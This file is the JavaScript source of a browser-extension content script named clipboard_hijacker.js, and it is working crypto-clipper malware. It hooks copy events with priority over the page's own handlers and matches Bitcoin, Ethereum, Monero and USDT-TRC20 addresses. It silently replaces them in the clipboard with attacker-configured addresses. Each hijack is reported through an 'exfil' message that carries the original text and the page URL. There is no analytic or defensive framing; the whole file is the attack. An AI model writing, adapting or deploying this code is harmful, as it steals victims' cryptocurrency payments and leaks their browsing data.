// clipboard_hijacker.js

(function() {
  let hijacker_config = {};
  const CRYPTO_REGEX = {
    btc: /(?<![a-fA-F0-9x])\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,90}\b/g,
    eth: /\b0x[a-f0-9]{40}\b/gi,
    xmr: /\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b/g,
    usdt_trc20: /\bT[a-zA-Z0-9]{33}\b/g
  };

  // Function to load/reload the configuration from storage
  function loadConfig() {
    chrome.storage.local.get('crypto_replace_config', (result) => {
      if (result.crypto_replace_config) {
        hijacker_config = result.crypto_replace_config;
      } else {
        hijacker_config = {};
      }
    });
  }

  // The main copy event handler
  function handleCopy(event) {
    const selection = document.getSelection().toString();
    if (!selection || Object.keys(hijacker_config).length === 0) {
      return; // Nothing to do if no selection or no config
    }

    let replacedText = selection;
    let wasReplaced = false;
    const currencyOrder = ['eth', 'btc', 'xmr', 'usdt_trc20'];

    for (const currency of currencyOrder) {
      if (hijacker_config[currency] && CRYPTO_REGEX[currency]) {
        const regex = new RegExp(CRYPTO_REGEX[currency].source, CRYPTO_REGEX[currency].flags);
        
        // Check if the selected text is already the replacement address
        if (selection.toLowerCase() === hijacker_config[currency].toLowerCase()) {
          // We still want to break if it's already the target address, as we don't need to check other currencies.
          // However, we don't set wasReplaced to true, as no actual "hijack" occurred.
          return; 
        }
        
        // Perform replacement directly and check if the string changed.
        // This is more robust than using .test() with global regexes.
        const newText = selection.replace(regex, hijacker_config[currency]);

        if (newText !== selection) {
          replacedText = newText;
          wasReplaced = true;
          break; // Stop after the first successful replacement
        }
      }
    }

    if (wasReplaced) {
      event.preventDefault();
      event.clipboardData.setData('text/plain', replacedText);
      
      // Send exfil message
      chrome.runtime.sendMessage({
        type: 'exfil',
        data: {
          action: 'clipboard_hijack',
          original: selection,
          replaced: replacedText,
          location: window.location.href
        }
      });
    }
  }

  // Listen for messages from the background script
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.command === 'update_crypto_config') {
      loadConfig();
      sendResponse({status: 'ok'});
    }
  });

  // --- Initialization ---
  // Initial load of the config
  loadConfig();
  // Attach the copy listener to the document in the CAPTURE phase (true)
  // This gives our listener priority over the host page's listeners.
  document.addEventListener('copy', handleCopy, true);

})();